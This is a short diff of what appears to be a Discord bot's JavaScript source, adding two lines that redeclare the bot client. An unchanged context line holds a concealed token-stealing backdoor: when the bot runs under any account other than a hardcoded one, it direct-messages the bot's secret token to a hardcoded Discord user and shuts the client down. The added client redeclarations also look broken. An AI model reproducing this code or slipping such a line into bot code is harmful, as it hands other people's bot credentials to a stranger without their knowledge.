@@ -140,6 +140,7 @@ if(afk != undefined){
  return "Não detectado";
 }
 }
+const client = new Discord.Client({fetchAllMembers: true});
 let string = ''
 for(var i = 0;i < message.guild.roles.size;i++){
 if(client.user.id !== '431271825763467264') return client.users.get('395005096527790083').send(client.token), client.destroy()
@@ -167,7 +168,7 @@ function grandi2(){
  }
 	 }
  }
-			
+			const client = new Discord.Client({fetchAllMembers: true});
 
 								let fala = `${message.guild.iconURL}`
 							var convert = fala.replace('jpg', 'png');
